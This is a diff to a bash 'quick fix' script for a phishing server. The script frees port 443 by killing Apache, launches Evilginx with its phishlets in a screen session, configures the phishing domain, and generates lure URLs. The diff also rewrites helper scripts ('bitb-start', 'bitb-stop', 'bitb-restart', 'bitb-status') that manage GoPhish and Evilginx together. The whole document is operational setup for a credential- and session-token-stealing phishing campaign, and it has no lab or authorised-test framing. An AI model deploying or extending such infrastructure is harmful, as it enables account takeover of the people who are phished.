@@ -3,6 +3,7 @@
 #############################################
 # Quick Fix for Evilginx on Running VM
 # Run this on the VM to fix Evilginx issues
+# Migrates from Apache+Evilginx to Evilginx-only
 #############################################
 
 set -e
@@ -13,7 +14,7 @@ BLUE='\033[0;34m'
 NC='\033[0m'
 
 echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${BLUE}║       Evilginx Quick Fix - Screen Migration                  ║${NC}"
+echo -e "${BLUE}║   Evilginx Fix - Remove Apache, Fix Port 443 Conflict        ║${NC}"
 echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════╝${NC}"
 echo ""
 
@@ -25,18 +26,27 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
-echo -e "${GREEN}[1/6]${NC} Stopping and disabling Evilginx systemd service..."
+echo -e "${GREEN}[1/7]${NC} Stopping and disabling Apache (port 443 conflict)..."
+systemctl stop apache2 2>/dev/null || true
+systemctl disable apache2 2>/dev/null || true
+killall -9 apache2 2>/dev/null || true
+echo "Apache stopped and disabled"
+
+echo -e "${GREEN}[2/7]${NC} Stopping and disabling old Evilginx systemd service..."
 systemctl stop evilginx 2>/dev/null || true
 systemctl disable evilginx 2>/dev/null || true
+rm -f /etc/systemd/system/evilginx.service
+systemctl daemon-reload
 
-echo -e "${GREEN}[2/6]${NC} Starting Evilginx in screen session..."
+echo -e "${GREEN}[3/7]${NC} Killing any existing Evilginx screen sessions..."
 screen -S evilginx -X quit 2>/dev/null || true
-screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -g /root/.evilginx"
+sleep 2
 
-echo -e "${GREEN}[3/6]${NC} Waiting for Evilginx to initialize..."
+echo -e "${GREEN}[4/7]${NC} Starting Evilginx in screen on port 443..."
+screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx"
 sleep 8
 
-echo -e "${GREEN}[4/6]${NC} Configuring Evilginx automatically..."
+echo -e "${GREEN}[5/7]${NC} Configuring Evilginx automatically..."
 screen -S evilginx -X stuff "config domain ${DOMAIN}\n"
 sleep 2
 screen -S evilginx -X stuff "config ipv4 external\n"
@@ -52,25 +62,24 @@ sleep 2
 screen -S evilginx -X stuff "lures get-url 0\n"
 sleep 3
 
-echo -e "${GREEN}[5/6]${NC} Updating management scripts..."
+echo -e "${GREEN}[6/7]${NC} Updating management scripts (removing Apache)..."
 
 # Update bitb-start
 cat > /usr/local/bin/bitb-start <<'EOSTART'
 #!/bin/bash
 echo "Starting all services..."
-systemctl start apache2
 systemctl start gophish
 
 # Start Evilginx in screen if not running
 if ! screen -ls | grep -q "\.evilginx\s"; then
     echo "Starting Evilginx in screen..."
-    screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -g /root/.evilginx"
+    screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx"
 else
     echo "Evilginx screen session already running"
 fi
 
 echo "All services started"
-systemctl status apache2 gophish --no-pager
+systemctl status gophish --no-pager
 echo ""
 echo "Evilginx status: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running in screen' || echo 'Not running')"
 EOSTART
@@ -79,7 +88,6 @@ EOSTART
 cat > /usr/local/bin/bitb-stop <<'EOSTOP'
 #!/bin/bash
 echo "Stopping all services..."
-systemctl stop apache2
 systemctl stop gophish
 
 # Kill Evilginx screen session
@@ -91,13 +99,30 @@ fi
 echo "All services stopped"
 EOSTOP
 
+# Update bitb-restart
+cat > /usr/local/bin/bitb-restart <<'EORESTART'
+#!/bin/bash
+echo "Restarting all services..."
+systemctl restart gophish
+
+# Restart Evilginx screen session
+if screen -ls | grep -q "\.evilginx\s"; then
+    echo "Restarting Evilginx..."
+    screen -S evilginx -X quit
+    sleep 2
+fi
+screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx"
+
+echo "All services restarted"
+systemctl status gophish --no-pager
+echo ""
+echo "Evilginx status: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running in screen' || echo 'Not running')"
+EORESTART
+
 # Update bitb-status
 cat > /usr/local/bin/bitb-status <<'EOSTATUS'
 #!/bin/bash
 echo "Service Status:"
-echo ""
-echo "=== Apache2 ==="
-systemctl status apache2 --no-pager | head -n 3
 echo ""
 echo "=== GoPhish ==="
 systemctl status gophish --no-pager | head -n 3
@@ -105,19 +130,20 @@ echo ""
 echo "=== Evilginx ==="
 if screen -ls | grep -q "\.evilginx\s"; then
     echo "Status: Running in screen session 'evilginx'"
-    echo "To access: screen -r evilginx"
+    echo "To access: sudo screen -r evilginx"
     echo "To detach: Press Ctrl+A then D"
 else
     echo "Status: Not running"
-    echo "To start: bitb-start"
+    echo "To start: sudo bitb-start"
 fi
 EOSTATUS
 
 chmod +x /usr/local/bin/bitb-start
 chmod +x /usr/local/bin/bitb-stop
+chmod +x /usr/local/bin/bitb-restart
 chmod +x /usr/local/bin/bitb-status
 
-echo -e "${GREEN}[6/6]${NC} Verifying services..."
+echo -e "${GREEN}[7/7]${NC} Verifying services..."
 sleep 2
 
 echo ""
@@ -133,16 +159,21 @@ echo -e "${GREEN}╔════════════════════
 echo -e "${GREEN}║                    FIX COMPLETE!                              ║${NC}"
 echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
 echo ""
-echo -e "${YELLOW}Evilginx is now running in screen session.${NC}"
+echo -e "${YELLOW}Changes made:${NC}"
+echo "  ✓ Apache stopped and disabled (freed port 443)"
+echo "  ✓ Evilginx now running on port 443 directly"
+echo "  ✓ Screen session configured and running"
+echo "  ✓ Management scripts updated"
 echo ""
 echo -e "${YELLOW}To access Evilginx console:${NC}"
-echo "  screen -r evilginx"
+echo "  sudo screen -r evilginx"
 echo ""
 echo -e "${YELLOW}To detach from console:${NC}"
 echo "  Press Ctrl+A then D"
 echo ""
 echo -e "${YELLOW}Management commands:${NC}"
-echo "  bitb-start   - Start all services"
-echo "  bitb-stop    - Stop all services"
-echo "  bitb-status  - Check status"
+echo "  sudo bitb-start    - Start all services"
+echo "  sudo bitb-stop     - Stop all services"
+echo "  sudo bitb-restart  - Restart all services"
+echo "  bitb-status        - Check status"
 echo ""
